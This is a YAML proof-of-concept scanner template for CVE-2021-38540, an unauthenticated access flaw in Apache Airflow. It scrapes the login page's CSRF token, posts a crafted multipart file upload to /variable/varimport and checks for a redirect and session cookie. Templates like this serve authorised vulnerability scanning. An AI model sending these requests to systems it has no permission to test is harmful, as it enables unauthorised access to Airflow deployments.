name: poc-yaml-apache-airflow-cve-2021-38540-unauth
manual: true
transport: http
set:
    randstr: randomLowercase(8)
    rboundary: randomLowercase(8)
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /login/
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("Sign In - Airflow")
        output:
            search: '"type=\"hidden\" value=\"(?P<csrf>.*?)\">".submatch(response.body_string)'
            csrf: search["csrf"]
    r1:
        request:
            cache: true
            method: POST
            path: /variable/varimport
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: |-
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="csrf_token"

                {{csrf}}
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="file"; filename="{{randstr}}.json"
                Content-Type: application/json

                {
                    "type": "{{randstr}}"
                }

                ------WebKitFormBoundary{{rboundary}}--
            follow_redirects: false
        expression: 'response.status == 302 && response.raw_header.bcontains(b"session=.") && response.body_string.contains("You should be redirected automatically to target URL: <a href=\"/\">")'
expression: r0() && r1()
detail:
    author: Â∞èz
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2021-38540
    vulnerability:
        level: critical